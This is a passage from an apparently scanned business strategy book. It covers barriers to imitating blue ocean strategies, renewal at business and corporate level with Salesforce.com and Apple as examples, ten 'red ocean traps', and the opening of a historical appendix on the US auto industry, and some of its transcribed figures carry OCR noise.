Brussels for\nnearly thirty years despite its enormous success. The reason is that the\nsize of Brussels could not support a second megaplex, which would\ncause both Kinepolis and its imitator to suffer. Moreover, the high\nvolume generated by a value innovation leads to rapid cost advantages,\nplacing potential imitators at an ongoing cost disadvantage. The huge\neconomies of scale in purchasing enjoyed by Walmart, for example,\nhave significantly discouraged other companies from imitating its blue\nocean strategy. Network externalities also block companies from easily\nand credibly imitating a blue ocean strategy, much as Twitter has\nenjoyed in social media. In short, the more users a site has online, the\nmore attractive it generally becomes to everyone, creating scant\nincentive for people to switch to a potential imitator. Other than these\neconomic factors, patents or legal permits also block imitation as they\ngrant a value innovator an exclusive legal right.\n\nFigure 10-1 provides a snapshot of these barriers to imitation. As the\nfigure shows, the barriers are numerous and nontrivial. This is why in many\nindustries, companies that created blue oceans do not face credible\nchallenges for many years, while the speed of imitation varies across\nindustries.\n\nFIGURE 10-1\n\nImitation barriers to blue ocean strategy\nAlignment barrier\n\n¢ Alignment of the value, profit, and people propositions around both differentiation and low cost\nbuilds sustainability and hence a formidable barrier to imitation.\n\nCognitive and organizational barrier\n\n‎Value innovation does not make sense to a company’s conventional logic.‏ ٭\n\n‎¢ Imitation often requires significant organizational changes.\n\n‎Brand barrier\n\n‎s Blue ocean strategy may conflict with other companies’ brand image.\n\n‎Companies that value-innovate earn brand buzz and a loyal customer following that tends to‏ ٭\n‎shun imitators.‏\n\n‎Economic and legal barrier\n\n‎s Natural monopoly: The market often cannot support a second player.\n\n‎¢ High volume leads to rapid cost advantage for the value innovator, discouraging followers from\nentering the market.\n\n‎s Network externalities discourage imitation.\n* Patents or legal permits block imitation.\n\nRenewal\n\nEventually, however, almost every blue ocean strategy will be imitated. As\nimitators try to grab a share of the blue ocean an organization created, it\ntypically launches offenses to defend its hard-earned customer base. But\nimitators often persist. Obsessed with hanging on to market share, the\norganization tends to fall into the trap of competing, racing to beat the new\ncompetition. Over time, the competition, and not the buyer, all too often\ncomes to occupy the center of its strategic thought and actions. If an\norganization stays on this course, the basic shape of its strategic profile or\nvalue curve will begin to converge with those of the competition. To avoid\nthe trap of competing, renewal is needed. The questions here are: When\nshould a single-business firm value-innovate again? And, how can a\nmultibusiness firm renew its portfolio of businesses in blue ocean terms as\ncompetition heats up?\nRenewal at the Individual Business Level\n\nTo avoid the trap of competing at the individual business level, monitoring\nvalue curves on the strategy canvas is essential. Monitoring value curves\nsignals when to value-innovate and when not to. It alerts an organization to\nreach out for another blue ocean when its value curve begins to converge\nwith those of the competition.\n\nIt also keeps a company from pursuing another blue ocean when there is\nstill a huge profit stream to be collected from its current offering. When a\ncompany’s value curve still has focus, divergence, and a compelling tagline,\nit should resist the temptation to value-innovate the business again and\ninstead should focus on lengthening, widening, and deepening its rent\nstream through operational improvements and geographical expansion to\nachieve maximum economies of scale and market coverage. It should swim\nas far as possible in the blue ocean, making itself a moving target,\ndistancing itself from early imitators, and discouraging them in the process.\nThe aim here is to dominate the blue ocean over imitators for as long as\npossible.\n\nAs rivalry intensifies and total supply exceeds demand, bloody\ncompetition commences and the ocean will turn red. As competitors’ value\ncurves converge, an organization should begin reaching out for another\nvalue innovation to create a new blue ocean. Hence, by charting a\ncompany’s value curve on the strategy canvas and intermittently replotting\nits competitors’ value curves versus its own, a company will be able to\nvisually see the degree of imitation and, hence, of value curve convergence\nand the extent to which its blue ocean is turning red.\n\nThe Body Shop, for example, dominated the blue ocean it had created for\nmore than a decade. The company, however, is now in the middle of a\nbloody red ocean, with declining performance. It did not reach out for\nanother value innovation when competitors’ value curves converged with its\nown. [yellow tail] has also dominated the blue ocean it created for more\nthan a decade and has since been successfully rolling out across the globe.\nIt made the competition irrelevant and has enjoyed strong, profitable growth\nas a result. However, today, numerous other players have since jumped into\nthe blue waters of new market space. The test of Casella Wines’ long-run\nprofitable growth will be its ability to value-innovate again before imitators\nare able to compete both aggressively and credibly with converging value\ncurves. It’s also time for others like Cirque du Soleil and Curves to reach\nfor a new blue ocean. Hence, understanding how to manage the dynamic\nprocess of continuous renewal is key.\n\nA good example to illustrate this dynamic renewal process is\nSalesforce.com. Salesforce.com made a series of successful strategic moves\nto renew its blue ocean in the B2B customer relationship management\n(CRM) industry. Since its initial strategic move in the early 2000s,\nSalesforce.com has sustained undisputed market leadership in the blue\nocean of on-demand CRM automation that it created for nearly fifteen\nyears. This is all the more impressive as it operates in the fast-moving high-\ntech sector. While numerous competitors, both large, established\nincumbents with deep pockets and new upstarts, have tried to dislodge it\nover the years, Salesforce.com has repeatedly broken away from the pack\nby value-innovating again as other companies’ value curves began to\nconverge toward its own. In this way, it has successfully avoided the trap of\ncompeting and kept itself in the blue. Consider:\n\nIn 2001, Salesforce.com redefined the traditional CRM software industry,\nby effectively making traditional packaged software largely irrelevant.\nGone were the needs for expensive software, complicated and time-\nconsuming client-side installation, difficulty and risk in use, and the\nconstant need for costly maintenance and upgrades. Instead, Salesforce.com\noffered business users web-based CRM solutions that focused on core\nfunctionalities, worked instantaneously upon subscription, and had high\nreliability and usability with ubiquitous access at a small fraction of the cost\nof traditional CRM software. In this way, Salesforce.com created a blue\nocean of all new demand that captured small and medium-sized companies\nthat had effectively been noncustomers of the industry.\n\nOver time, however, competitors jumped in to reap profits from the new\nmarket space of on-demand CRM automation that Salesforce.com created.\nLarge players offered hybrid solutions, and an increasing number of small\nplayers entered the on-demand CRM market in an attempt to provide\nsimilar offerings. To break away from the competition, Salesforce.com\nmade a new blue ocean strategic move to renew its initial value innovation\noffering.\nWith the launch of Force.com, a cloud-based development tool for\ncreating add-on applications, and AppExchange, a web-based applications\nmarketplace, Salesforce.com allowed corporate clients to obtain a range of\non-demand customized programs at low cost while still retaining the\nsimplicity, convenience, reliability, and low risk of its original offering,\nachieving both differentiation and low cost.\n\nTo discourage imitation and further deepen its blue ocean that\ncompetitors continued to eye, Salesforce.com went a step further and\nextended its value curve by launching Chatter, a private social networking\nservice that allowed coworkers within a company to send, receive, and\nfollow information updates in real time, thereby enhancing collaboration\nand resolving the problem of fragmentation that plagued the\nimplementation and use of traditional CRM systems. In this way, not only\nhas Salesforce.com been able to maintain a gap between its value curve and\nthose of others over time, but it has also continued to expand the size of the\nblue ocean, with large corporations now equally eager to deploy on-demand\nweb-based CRM applications due to its successive value innovation moves.\nRenewal at the Corporate Level for a Multibusiness\nFirm\n\nWhile the renewal issue for companies with a single business offering or\nproduct can be addressed by charting a business’s value curve against\ncompetitors’ on the strategy canvas over time as described, a complementary\ntool is needed for companies that have a portfolio of diverse business\nofferings, as executives responsible for corporate strategy should monitor\nand plan the renewal of their business portfolios from the corporate\nperspective. A dynamic extension of the pioneer-migrator-settler (PMS) map\nintroduced in chapter 4 serves this purpose well. It can be used to visually\ndepict the movement of a corporate portfolio in one picture by capturing a\ncorporation’s portfolio of business offerings over time.\n\nBy plotting the corporate portfolio as pioneers, migrators, and settlers on\nthe dynamic PMS map, executives can see at a glance where the gravity of\nits current portfolio of businesses is, how this has shifted over time, and\nwhen there is a need to create a new blue ocean to renew the portfolio. As\nexplained in chapter 4, settlers are me-too businesses, migrators represent\nvalue improvements, and pioneers are a company’s value innovations. While\nsettlers are today’s cash generators that typically have marginal growth\npotential, pioneers have high growth potential but often consume cash at the\noutset as they expand; migrators’ profitable growth potential lies somewhere\nin between.\n\nTo maximize growth prospects then, a company’s portfolio should have a\nhealthy balance between pioneers for future growth and migrators and\nsettlers for cash flow at a given point in time. Over time, however, a\ncompany’s current pioneers will eventually become migrators and then\nultimately settlers as imitation begins and intensifies. To maintain strong\nprofitable growth, executives need to ensure that as current pioneers become\nmigrators, the company is set to launch a new blue ocean either by\nregenerating an existing business or via a new business offering. Consider\nApple Inc. in this regard.\n\nFIGURE 10-2\nApple’s portfolio of businesses on the dynamic PMS map\n\nO App\nApp 辙0re.\n5 Store\nPioneers @ 〇 iPhone O\n. 〇 O iTunes |irunes\niPod Store Store\n3 ” 5 iTunes 一\n一 / Store / 飞\nMacintosh | ۱ ( |\nMigrators 7 万 N 一\n( ) Macintosh Macintosh\nMacintosh 10০0\n人\n‏٭‎ @ @ e ®\nSettlers 伟 fe) ‏اي‎ @\n7٦ 企\n1997 2003 2008 2014\n\nWhile the size of named circles roughly represents the relative revenues of\nApple’s main businesses, that of unnamed dots does not as they simply\nrepresent Apples peripheral products and services.\n\nThe Apple Store is not plotted, although it is recognized as a blue ocean in\nthe retail industry, as its sales are already captured in all existing products.\n\nFigure 10-2 depicts Apple’s portfolio of businesses on the dynamic PMS\nmap. A series of blue ocean strategic moves led Apple to become America’s\nmost admired and valuable company within a decade. The iMac, iPod,\niTunes Store, iPhone, and iPad were created by different business units\nserving different industry sectors, yet they shared a common strategic\napproach—reconstructing the existing markets and creating new demand.\nAlthough these strategic moves were planned and executed by individual\n\nbusiness units, it was Apple Inc. that planned and orchestrated its business\nportfolio at the corporate level.\n\nAs seen in figure 10-2, Apple has maintained strong profitable growth by\nkeeping a successful balance across its pioneers, migrators, and settlers over\ntime, even as once pioneers lost their pioneer status. This was achieved by\nlaunching new blue ocean businesses as previous pioneer businesses were\nstarting to be imitated. In looking at Apple’s portfolio across time, its\nprofitable growth was first lifted in 1998 when it dramatically simplified its\nMacintosh product range and launched the value-innovative iMac, the first\ncolorful, friendly desktop computer that made it easy for the first time to\nconnect to the internet. The iMac literally made people smile and introduced\nfashion and aesthetics into computers. While the iMac transformed Apple’s\nMacintosh division into a high migrator, Apple quickly followed this with\nthe launch of the iPod. The iPod revolutionized the digital music market,\ncreating an uncontested blue ocean, which was strengthened further with its\nlaunch of the iTunes Music Store two years later. As the iPod was eventually\nimitated and sank toward migrator status, Apple reached out and launched its\nnext blue ocean, the iPhone.\n\nApple continued to launch subsequent blue oceans over time, including its\napp store and the iPad to ensure the next chunk of growth at the corporate\nlevel as others began to encroach on the blue oceans it was creating in its\nindividual businesses. As the dynamic PMS map also makes clear, that is not\nto say that Apple is only about blue oceans; nor should any company’s\ncorporate portfolio be. Companies with a diverse portfolio of businesses,\nsuch as Apple, General Electric, Johnson & Johnson, or Procter & Gamble,\nwill always need to swim in both red and blue oceans at a given point in time\nand succeed in both oceans at the corporate level. This means that\nunderstanding and applying the competition-based principles of red ocean\nstrategy are also needed. Once Apple’s iPod began to be imitated, for\nexample, to counter competition it rapidly launched a range of iPod variants\nat various price points with the iPod mini, shuffle, nano, touch, and so on.\nThis not only served to keep encroaching competitors at arm’s length, but\nalso expanded the size of the ocean it created, allowing Apple, not imitators,\nto capture the lion’s share of the profit and growth of this new market space.\nBy the time the iPod’s blue ocean became crowded with more imitators,\nApple had created another blue ocean by introducing the iPhone.\nIn this way, Apple has been successfully managing its corporate portfolio\nfor strong profitable growth. The challenge for Apple in going forward will\nbe to continue to renew its portfolio, as current pioneers eventually become\nmigrators and settlers, so that it can maintain a healthy balance between the\nprofit of today and the growth of tomorrow. This is the precise challenge\nMicrosoft has been facing for several years. Despite relatively strong profit,\nMicrosoft has failed to maintain a healthy balance across pioneers,\nmigrators, and settlers. While it has proven to be adept at knowing how to\ncompete and get profit out of settler businesses, Microsoft has launched no\nnew pioneers, whether a search engine like Google, a social network site like\nFacebook, a video game console like the Wii, or popular web services like\nTwitter to renew its corporate portfolio. Its deep dependence on the settler\nbusinesses of Office and Windows that dominate its portfolio has severely\npenalized Microsoft. Profit aside, its stock price has been unimpressive for\nmore than a decade and, even more telling, it has lost its luster in attracting\ntop talent. For Microsoft to get out of its slump, it needs to work toward\ncreating a better balanced portfolio across businesses that not only compete\nin red oceans but also create blue oceans, which renew, expand, and build its\nbrand value.\n\nThe eight principles of blue ocean strategy proposed in this book should\nserve as essential pointers for every company thinking about its future\nstrategy if it aspires to lead the increasingly overcrowded business world.\nThis is not to suggest that companies will suddenly stop competing or that\nthe competition will suddenly come to a halt. On the contrary, the\ncompetition will be more present and will remain a critical factor of market\nreality. As captured on the dynamic PMS map, red ocean and blue ocean\nstrategies are complementary strategic perspectives, with each serving\ndifferent and important purposes.\n\nBecause blue and red oceans have always coexisted, practical reality\ndemands that companies succeed in both oceans and master the strategies for\nboth. But because companies already understand how to compete in red\noceans, what they need to learn is how to make the competition irrelevant.\nThis book aims to help balance the scales so that formulating and executing\nblue ocean strategy can become as systematic and actionable as competing\nin the red oceans of known market space.\nCHAPTER 11\n\nAvoid Red Ocean Traps\n\nIN THE ORIGINAL VERSION OF OUR BOOK, we focused on defining what blue\nocean strategy is and offering frameworks and analytic tools for creating\ncommercially relevant new market space as expressed by the strategy\ncanvas, four actions framework, the six paths, and so on. At the time, we\nfelt reassured that we had reached a level of articulation and clarity on blue\nocean strategy that would prevent misunderstandings from arising by all\nwho chose to dive into the book. Over the ensuing years, however, we\nfound that our assumption was not fully correct. People’s mental models,\ncoming from their backgrounds and preexisting knowledge, led them to\noften interpret blue ocean strategy through old conceptual lenses that\ninadvertently trapped them in the red ocean. In particular, we identified ten\ncommon red ocean traps that work against the creation of blue oceans.\n\nUnderstanding these red ocean traps is critical; they have powerful\nimplications for practice. If any one of these red ocean traps raises its head\nin your organization, beat it down. You have to get your framing right to\ncreate blue oceans. Perspective is critical to success. Your mind-set is more\ningrained than you realize. Hence, we end this expanded edition by laying\nout the ten common red ocean traps that keep organizations locked in the\nred ocean even as they attempt to sail into clear waters. To get the most out\nof the blue ocean strategy methodologies and tools as they are used in\npractice, an accurate understanding on the underpinning concepts that guide\ntheir proper application is essential.\nRed Ocean Trap One: The belief that blue ocean strategy is a\ncustomer-oriented strategy that’s about being customer led.\n\nA blue ocean strategist gains insights about reconstructing market\nboundaries not by looking at existing customers, but by exploring\nnoncustomers. When organizations mistakenly assume that blue ocean\nstrategy is about being customer led, they reflexively focus on what they’ ve\nalways focused on: existing customers and how to make them happier.\nWhile such a perspective may shed insight on ways to improve value for\ncurrent industry customers, it is not the path to create new demand. To\ncreate new demand, an organization needs to turn its focus to noncustomers\nand why they refuse to patronize an industry. Noncustomers, not customers,\nhold the greatest insight into an industry’s pain points and points of\nintimidation that limit the size and boundary of the industry. This is why to\ncreate new demand, analyzing and understanding the three tiers of\nnoncustomers are essential components of blue ocean strategy. A focus on\nexisting customers, by contrast, tends to drive organizations to do more of\nthe same for less, thereby anchoring companies in the red ocean irrespective\nof their blue ocean intent.\n\nRed Ocean Trap Two: The belief that to create blue oceans, you must\nventure beyond your core business.\n\nThere is a common misperception that to create a blue ocean and break out\nof the red, organizations must venture into industries outside their core,\nwhich understandably appears to multiply risk. And a select few do. Virgin\nis a classic example, and Apple in recent years metamorphosed from a\ncomputer maker to a consumer electronics and media giant. These,\nhowever, are exceptions, not the rule. Blue oceans can just as easily and\nmore readily be created smack in the middle of an organization’s existing\ncore businesses. Think of Casella Wines with [yellow tail] in the wine\nindustry, Nintendo with the Wii, Chrysler with the minivan, Apple with its\niMac, Philips with Alto in the professional lighting industry, or even the\nNew York City Police Department with Bratton’s blue ocean strategic move\nin policing. All come from within, not beyond, red oceans of existing\nindustries. This challenges the view that new markets are in distant waters.\nBlue oceans are right next to you in every industry. Understanding this is\nkey. When companies mistakenly believe that they must venture beyond\ntheir core business to create blue oceans, they tend to either shy away from\nventuring beyond the red ocean or, to the contrary, look far afield to other\nindustries that have little overlap with their knowledge, skills, and\ncompetencies, which makes success that much more difficult, with failed\nattempts keeping them locked in the red ocean.\n\nRed Ocean Trap Three: The misconception that blue ocean strategy\nis about new technologies.\n\nA blue ocean strategic move is not about technology innovation per se.\nThink of Comic Relief, [yellow tail], JCDecaux, or Starbucks for starters—\nall made blue ocean strategic moves that involved no bleeding-edge new\ntechnologies. Even where technology is heavily involved, as with\nSalesforce.com, Intuit’s Quicken, or Apple’s iPhone, the reason buyers love\nthese blue ocean offerings isn’t because they involve bleeding-edge\ntechnology per se, but because these offerings make the technology\nessentially disappear from buyers’ minds. The products and services are so\nsimple, easy to use, fun, and productive that buyers fall in love with them.\nSo technology is not a defining feature. You can create blue oceans with or\nwithout it. However, where technology is involved, it’s key that you link it\nto value. Ask: How does your product or service offer a leap in productivity,\nsimplicity, ease of use, convenience, fun, and/or environmental\nfriendliness? Without that, bleeding-edge technology notwithstanding, you\nwon’t open up a blue ocean of commercial opportunity. Value innovation,\nnot technology innovation, is what opens up commercially compelling new\nmarkets. When companies mistakenly assume blue ocean strategy hinges on\nnew technologies, their organizations tend to push for products or services\nthat are either too out there, too complicated, or lacking the complementary\necosystem needed to open up a new market space.\n\nRed Ocean Trap Four: The belief that to create a blue ocean, you\nmust be first to market.\n\nBlue ocean strategy is not about being first to market. Rather it’s about\nbeing first to get it right by linking innovation to value. One need only look\nto Apple here. The iMac wasn’t the first PC, the iPod wasn’t the first MP3\nplayer, iTunes wasn’t the first digital music store, and the iPhone certainly\nwasn’t the first smart phone, nor for that matter was the iPad the first smart\ntablet. But what they all successfully did was link innovation to value.\nOrganizations that mistakenly assume blue ocean strategy is about being\nfirst to market all too often get their priorities wrong. They inadvertently\nput speed before value. While speed is important, speed alone will not\nunlock a blue ocean. Corporate graveyards are full of companies that got to\nmarket first with innovative offerings not linked to value.! To avoid this\ntrap, companies need to continuously drive home the idea that while speed\nmay be important, even more important is linking innovation to value. No\ncompany should rest easy until it achieves value innovation.\n\nRed Ocean Trap Five: The misconception that blue ocean strategy\nand differentiation strategy are synonymous.\n\nUnder traditional competitive strategy, differentiation is achieved by\nproviding premium value at a higher cost to the company and at a higher\nprice for customers. Think Mercedes Benz. Differentiation is a strategic\nchoice that reflects the value-cost trade-off in a given market structure. Blue\nocean strategy, by contrast, is about breaking the value-cost trade-off to\nopen up new market space. It is about pursuing differentiation and low cost\nsimultaneously. Is Casella Wine’s [yellow tail] or Comic Relief’s Red Nose\nDay differentiated in terms of having a different strategic profile than other\nplayers’? You bet. But are they also low cost? Yes again. Blue ocean\nstrategy is an “and-and,” not an either-or, strategy. When companies\nmistakenly assume that blue ocean strategy is synonymous with\ndifferentiation, they all too often miss the and-and of blue ocean strategy.\nInstead they tend to focus on what to raise and create to stand apart and pay\nscant heed to what they can eliminate and reduce to simultaneously achieve\nlow cost. In this way, organizations inadvertently become either premium\ncompetitors or differentiated niche players in existing industry space rather\nthan creating value innovation that makes the competition irrelevant.\n\nRed Ocean Trap Six: The misconception that blue ocean strategy is a\nlow-cost strategy that focuses on low pricing.\n\nThis red ocean trap is the obvious flip side of red ocean trap five and pops\nup just as often. Again, blue ocean strategy pursues differentiation and low\ncost simultaneously by reconstructing market boundaries. Instead of\nfocusing on low cost per se, it seeks to create a leap in buyer value at a\nlower cost. Further, a blue ocean strategic move captures the mass of target\nbuyers not through low-cost pricing, but through strategic pricing. The key\nhere is not to pursue pricing against the competition within an industry but\nto pursue pricing against substitutes and alternatives that are currently\ncapturing the noncustomers of your industry.\n\nUsing strategic pricing, a blue ocean does not have to be created at the\nlow end of the market. Instead it can be created at the high end, as Cirque\ndu Soleil, Starbucks, or Dyson did; at the low end, as Southwest Airlines or\nSwatch did; or in the middle range of a market. Even where blue oceans are\ncreated at the low end, as in the case of Southwest Airlines or Swatch,\nwhich have among the lowest price points and cost structures in the airline\nand watch industries, respectively, ask yourself, do you think of these as\nlow cost alone? If you are like most, your answer is no. True, they are low\ncost and low priced, but they also stand out and are clearly differentiated in\nthe eyes of buyers. Southwest Airlines stands out for its friendly, fast,\nground-transportation-in-the-air feel, while Swatch’s stylish, fun designs set\nit apart and make it a fashion statement. That is, they are perceived as being\nboth differentiated and low cost even at the low end of the market. When\norganizations miss this point and mistakenly see blue ocean strategy as\nsynonymous with low cost and low pricing, they inadvertently focus on\nwhat to eliminate and reduce in the current industry offering to offer rock-\nbottom prices. In doing so, they fail to simultaneously focus on what they\nshould raise and create to also achieve the differentiation needed to stand\napart and set sail into the blue ocean.\n\nRed Ocean Trap Seven: The belief that blue ocean strategy is the\nsame as innovation.\n\nBlue ocean strategy is not synonymous with innovation per se. Unlike blue\nocean strategy, innovation is a very broad concept that is based on an\noriginal and useful idea regardless of whether that idea is linked to a leap in\nvalue that can appeal to the mass of buyers. Take Motorola’s Iridium. Was it\nan innovation? Sure. It was the first global phone and it was useful. But was\nit a value innovation? No. As Motorola learned, a breakthrough in\ntechnology is not necessarily synonymous with a breakthrough in value that\ncan attract the target mass of buyers. The Iridium was a useful technological\nfeat that worked around the world, including the far reaches of the Gobi\ndesert, but did not work in buildings and cars, the precise places that global\nexecutives on the move most needed them to work. It failed to create a leap\nin value for its target mass of buyers—business executives.\n\nIn fact, many technology innovators fail to create and capture blue\noceans by confusing innovation with value innovation, the cornerstone of\nblue ocean strategy. Value innovation, not innovation per se, is the singular\nfocus of blue ocean strategy. Simply creating something original and useful\nthrough innovation is not enough to create and capture a blue ocean, even if\nthe innovation wins the company accolades and its researchers a Nobel\nPrize. To capture a commercially compelling blue ocean, companies need a\nstrategy that can align their value, profit, and people propositions in pursuit\nof both differentiation and low cost. When organizations fail to register the\ndifference between value innovation and innovation per se, they all too\noften end with an innovation that breaks new ground but does not unlock\nthe mass of target buyers, keeping them by and large stuck in the red ocean.\n\nRed Ocean Trap Eight: The belief that blue ocean strategy is a\ntheory of marketing and a niche strategy.\n\nCertainly, the blue ocean strategy frameworks and tools can be effectively\ndeployed to reframe, analyze, and resolve the marketing issues of an\norganization as it strives to break out of the red ocean. Especially relevant\nare those issues related to developing a blue ocean value proposition, as\ndiscussed in the beginning chapters of the book. However, blue ocean\nstrategy requires more than a compelling value proposition. As we discuss\nin the second half of the book, sustainable success can only be achieved\nwhen a company’s value proposition is supported by key internal and\nexternal people involved in its execution and is complemented by a strong\nprofit proposition. Hence, to equate blue ocean strategy with a theory of\nmarketing myopically masks the holistic approach needed to create a\nsustainable high-performance strategy, including overcoming organizational\nhurdles, winning people’s trust and commitment, and creating the proper\nincentives via a compelling people proposition. This inaccurate\nunderstanding of blue ocean strategy can often lead to a lack of alignment\nacross the three strategy propositions of value, profit, and people.\n\nBlue ocean strategy should also not be confused with a niche strategy.\nWhile the field of marketing has placed significant emphasis on finer\nsegmentation to effectively capture niche markets, blue ocean strategy\nworks in the reverse direction. It is more about desegmenting markets by\nfocusing on key commonalities across buyer groups to open up and capture\nthe largest catchment of demand. When practitioners confuse the two, they\nall too often are driven to look for customer differences for niche markets in\nthe existing industry space rather than the commonalities that cut across\nbuyer groups in search of blue oceans of new demand.\n\nRed Ocean Trap Nine: The belief that blue ocean strategy sees\ncompetition as bad when in fact it can be good for companies.\n\nBlue ocean strategy does not see competition as bad. However, unlike\ntraditional economic thought, it does not see competition as always good.\nHistorically, economists argued that absent competition, companies have no\nincentive to improve their product or service, but with competition,\ncompanies are pushed to up their game, lower their prices, and improve\ntheir products and services. At the level of the firm, however, competition is\nonly good up to a point. When supply exceeds demand, as it does in an\nincreasing array of industries, the intensity of competition tends to have\ndeleterious effects on the profitable growth of organizations, as more and\nmore firms fight to win a slice of a given pool of customers, triggering\nintense price pressure, razor-thin margins, commoditization of offerings,\nand slower growth. If companies continue to compete further to grab a\nbigger share of the existing pie without expanding it or creating a new one,\nsuch competitive actions are bound to produce negative economic\nconsequences for firms. This is why blue ocean strategy argues that firms\nneed to go beyond competing and the mere improvement of product or\nservices in overcrowded industries and pursue value innovation to open up\nnew market space and make the competition irrelevant. Hence, while\nunderstanding how to compete in existing market space is important, blue\nocean strategy addresses the critical challenge of how to redefine industry\nboundaries and create new market space when structural conditions work\nagainst you. This is how blue ocean strategy deals with competition to\nproduce continuous renewal and the growth of industries.\n\nRed Ocean Trap Ten: The belief that blue ocean strategy is\nsynonymous with creative destruction or disruption.\nCreative destruction or disruption occurs when an innovation disrupts an\nexisting market by displacing an earlier technology or existing product or\nservice. The word “displacement” is important here, as without\ndisplacement, disruption would not occur. In the case of photography, for\nexample, the innovation of digital photography disrupted the photographic\nfilm industry by effectively displacing it. So today digital photography is\nthe norm, and photographic film is seldom used. Disruption is, hence,\nlargely consonant with Schumpeter’s concept of creative destruction,\nwhereby the old is incessantly destroyed or replaced by the new. Unlike\ndisruption, however, blue ocean strategy does not necessitate displacement\nor destruction. Blue ocean strategy is a broader concept that goes beyond\ncreative destruction to embrace nondestructive creation, which is its\noverriding emphasis.\n\nTake Viagra, which created a blue ocean in lifestyle drugs. Did Viagra\neffectively disrupt an existing industry by displacing an earlier technology\nor existing product or service? No. It created a blue ocean via\nnondestructive creation. By reconstructing existing market boundaries, blue\nocean strategy creates new market space within and beyond existing\nindustries. When new market space is created beyond existing industry\nboundaries, as with Viagra, reconstruction tends to bring about\nnondestructive creation. When, on the other hand, new market space is\ncreated within an existing industry, like disruptive innovation, displacement\ntends to occur. However, in many cases, even when the reconstruction\noccurs within industries, blue ocean strategy also produces nondestructive\ncreation. Nintendo’s Wii, for example, created a blue ocean in the video\ngame industry. It had an element of creative destruction. However, the new\nmarket space it created of physically active, family-centered video gaming\nhad an even larger element of nondestructive creation that complemented,\nmore than disrupted or displaced, existing video games.\n\nThe important question for practice is, What drives blue ocean strategy to\ngo beyond creative destruction to nondestructive creation, which is a key\ngoal of most companies as well as of governments in their quest to\nstimulate economic growth? The essential point here is that blue ocean\nstrategy is not about finding a better or lower-cost solution to the existing\nproblem of an industry, both of which trigger disruption and displacement\nof existing products and services. Instead, blue ocean strategy is about\nredefining the problem itself, which tends to create new demand or an\noffering that often complements rather than displaces existing products and\nservices. The six paths framework in chapter 3 is critical in this regard as it\nprovides systematic ways to redefine industry problems to open up new\nmarket space.\n\nTo put the ideas and methodologies contained in this book into proper\npractice, you need to have a robust understanding not only of the building\nblocks of blue ocean strategy, but also of the assumptions that lurk behind\nthe red ocean traps. While some of these misconceptions are more\nconceptual than others, they all matter if you are to use the blue ocean\nstrategy tools and methodologies to achieve their intended objectives in\npractice. This is why we felt the need to end this expanded edition by\nclarifying the red ocean traps. Only then can we move one step closer to\nachieving our ultimate goal of bringing blue ocean strategy theory closer to\npractice.\nAPPENDIX A\n\nA Sketch of the Historical Pattern of Blue\nOcean Creation\n\nAT THE RISK OF OVERSIMPLIFICATION, here we present a snapshot overview\nof the history of three American industries—automobiles, computers, and\nmovie theaters—from the perspective of major product and service\nofferings that opened new market space and generated significant new\ndemand. This review, which spans the start of these industries until roughly\n2005, intends to be neither comprehensive in its coverage nor exhaustive in\nits content. Its aim is limited to identifying the common strategic elements\nacross key blue ocean offerings. US industries are chosen here because they\nrepresent the largest and least regulated free market during our study period.\n\nAlthough the review is only a sketch of the historical pattern of blue\nocean creation, several patterns stand out across these three representative\nindustries.\n\ne There is no permanently excellent industry. The attractiveness of all\nindustries rose and fell over the study period.\n\n* There are no permanently excellent companies. Companies, like\nindustries, rose and fell over time. These first two findings both\nconfirm and add further evidence that permanently excellent\ncompanies and industries do not exist.\n\n* Akey determinant of whether an industry or a company was on a\nrising trajectory of strong, profitable growth was the strategic move of\nblue ocean creation. The creation of blue oceans was a key catalyst in\nsetting an industry on an upward growth and profit trajectory. It was\nalso a pivotal determinant driving a company’s rise in profitable\ngrowth, as well as its fall when another company gained the lead and\ncreated a new blue ocean.\n\n* Blue oceans were created by both industry incumbents and new\nentrants, challenging the lore that start-ups have natural advantages\nover established companies in creating new market space. Moreover,\nthe blue oceans created by incumbents were usually within their core\nbusinesses. In fact, most blue oceans are created from within, not\nbeyond, red oceans of existing boundaries. Issues of perceived\ncannibalization or creative destruction for established companies\nproved to be exaggerated.! Blue oceans created profitable growth for\nevery company launching them, start-ups and incumbents alike.\n\n* The creation of blue oceans was not about technology innovation per\nse. Sometimes leading-edge technology was present, but often it was\nnot a defining feature of blue oceans. This was true even when the\nindustry under examination was technology intensive, such as\ncomputers. Rather, the key defining feature of blue oceans was value\ninnovation—innovation that was linked to what buyers value.\n\n* The creation of blue oceans did more than contribute to strong,\nprofitable growth; this strategic move exercised a strong, positive\neffect on establishing a company’s standing brand name in buyers’\nminds.\n\nLet’s now turn to these three representative industries to let the history of\nblue ocean creation speak for itself. Here we begin with the auto industry, a\ncentral form of transportation in the developed world.\nThe Automobile Industry\n\nThe US auto industry dates back to 1893, when the Duryea brothers\nlaunched the first one-cylinder auto in the United States. At the time, the\nhorse and buggy was the primary means of US transportation. Soon after\nthe auto’s US debut, there were hundreds of auto manufacturers building\ncustom-made automobiles in the country.\n\nThe autos of the time were a luxurious novelty. One model even offered\nelectric curlers in the backseat for on-the-go primping. They were\nunreliable and expensive, costing around $1,500, twice the average annual\nfamily income. And they were enormously unpopular. Anticar activists tore\nup roads, ringed parked cars with barbed wire, and organized boycotts of\ncar-driving businessmen and politicians. Public resentment of the\nautomobile was so great that even future president Woodrow Wilson\nweighed in, saying, “Nothing has spread socialistic feeling more than the\nautomobile . . . a picture of the arrogance of wealth.”? Literary Digest\nsuggested, “The ordinary ‘horseless carriage’ is at present a luxury for the\nwealthy; and although its price will probably fall in the future, it will never,\n\nof course, come into as common use as the bicycle.”\n\nThe industry, in short, was small and unattractive. Henry Ford, however,\ndidn’t believe it had to be this way.\nThe Model 7\n\nIn 1908, while America’s five hundred automakers built custom-made\nnovelty automobiles, Henry Ford introduced the Model T. He called it the\ncar “for the great multitude, constructed of the best materials.” Although it\ncame in only one color (black) and one model, the Model T was reliable,\ndurable, and easy to fix. And it was priced so that the majority of Americans\ncould afford one. In 1908 the first Model T cost $850, half the price of\nexisting automobiles. In 1909 it dropped to $609, and by 1924 it was down\nto $290.4 In comparison, the price of a horse-driven carriage, the car’s\nclosest alternative at the time, was around $400. A 1909 sales brochure\nproclaimed, “Watch the Ford Go By, High Priced Quality in a Low Priced\nCar.”\n\nFord’s success was underpinned by a profitable business model. By\nkeeping the cars highly standardized and offering limited options and\ninterchangeable parts, Ford’s revolutionary assembly line replaced skilled\ncraftsmen with ordinary unskilled laborers who worked one small task\nfaster and more efficiently, cutting the time to make a Model T from\ntwenty-one days to four days and cutting labor hours by 60 percent.° With\nlower costs, Ford was able to charge a price that was accessible to the mass\nmarket.\n\nSales of the Model T exploded. 